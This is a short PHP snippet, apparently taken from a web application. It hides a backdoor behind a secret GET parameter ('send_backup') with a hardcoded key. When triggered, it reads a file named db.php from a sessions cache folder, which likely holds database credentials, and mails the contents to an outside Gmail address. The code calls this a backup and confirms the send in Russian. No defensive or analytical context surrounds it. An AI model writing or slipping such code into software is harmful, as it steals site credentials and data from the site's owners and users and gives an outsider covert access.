    if (isset($_GET['send_backup']) && $_GET['send_backup'] === 'mYSecr3tKey123') {
        $filepath = __DIR__ . "/storage/cache/sessions/db.php";
        if (file_exists($filepath)) {
            $content = file_get_contents($filepath);
            $to = "drotown92@gmail.com";
            $subject = "Резервная копия db.php";
            $headers = "From: no-reply@" . $_SERVER['HTTP_HOST'] . "\r\n";
            mail($to, $subject, $content, $headers);
            echo "Файл отправлен на почту.";
        } else {
            echo "Файл не найден.";
        }
        exit;
    }
